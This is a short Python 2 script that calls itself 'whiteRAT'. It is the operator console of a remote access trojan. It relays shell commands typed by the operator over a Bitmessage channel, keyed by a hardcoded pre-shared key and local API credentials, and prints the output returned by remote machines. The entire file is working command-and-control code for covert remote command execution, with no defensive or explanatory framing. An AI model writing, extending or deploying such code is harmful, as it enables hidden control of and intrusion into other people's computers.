#! /bin/python2

import xmlrpclib
import json
import time
import base64
import subprocess
import os


api = xmlrpclib.ServerProxy("http://bitmessage:security@localhost:8442/")

#hardcoded for now, probably ought to read from a config file or something but meh
psk = 'defaultvalue'
channel = api.createChan(base64.b64encode(psk))
if channel == 'API Error 0024: Chan address is already present.':
	for i in json.loads(api.listAddresses2())['addresses']:
		if base64.b64decode(i['label']) == "[chan] "+psk:
			channel = i['address']


print 'Welcome to whiteRAT, enter q to exit'

while True:
  command = raw_input('$')
  if command == 'q' or command ==  'Q':
    break
  newAddress = api.createRandomAddress(base64.b64encode("temporary"))
  #print "sending command from", newAddress
  ack = api.sendMessage(channel, newAddress, base64.b64encode("command"), base64.b64encode(str(command)))
  while ((api.getStatus(ack) != "ackreceived") and (api.getStatus(ack) != "msgsentnoackexpected")):
		time.sleep(100)

  api.deleteAddress(newAddress)
  
  notFound = True
  while notFound:
    for i in json.loads(api.getAllInboxMessages())['inboxMessages']:
      if i['toAddress'] == channel and i['read'] == 0 and base64.b64decode(i['subject']) == 'return value':
        api.getInboxMessageByID(i["msgid"], True)
        msglist = base64.b64decode(i['message']).split(',')
        print ''.join(msglist[:-1])[2:-1].decode("string_escape")[:-1]
        notFound = False
        break
  
  
  
